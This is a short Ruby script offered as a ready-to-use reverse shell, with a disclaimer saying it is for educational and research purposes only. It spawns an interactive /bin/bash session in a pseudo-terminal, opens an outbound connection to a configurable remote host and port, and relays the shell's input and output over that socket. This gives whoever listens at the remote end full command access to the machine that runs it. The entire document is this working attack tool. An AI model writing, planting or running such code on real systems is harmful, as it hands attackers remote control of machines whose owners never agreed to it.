#!/usr/bin/env ruby

### Disclaimer
#This code is provided for educational and research purposes only. 
#The author is not responsible for any misuse or damage caused by this code. 
#You are responsible for ensuring that you have proper authorization before testing systems. 
#You are solely responsible for your actions.
#Always get proper authorization before conducting any security testing.

require 'socket'
require 'pty'
require 'io/console'

#CHANGE TO REMOTE HOST IP
RHOST = "IP"
#CHANGE TO REMOTE HOST PORT
RPORT = "PORT"


#Send Messages and Receive Commands
PTY.spawn("/bin/bash") do | r, w, pid |
    sock = TCPSocket.new("#{RHOST}", "#{RPORT}")

    #Forward PTY Output to the Socket
    reader = Thread.new do
        begin
            r.each_char { |char| sock.print char; sock.flush }
        rescue Errno::EIO, Errno::ECONNRESET
            puts("\nThread error, connection closed.")
        end
    end 

    #Forward Socket Input to PTY
    begin
        while data = sock.gets
            w.print data
        end
    rescue Errno::ECONNRESET
        puts "Client disconnected."
    ensure
        sock.close
        Process.kill('TERM', pid) rescue nil
        reader.join
    end 

end
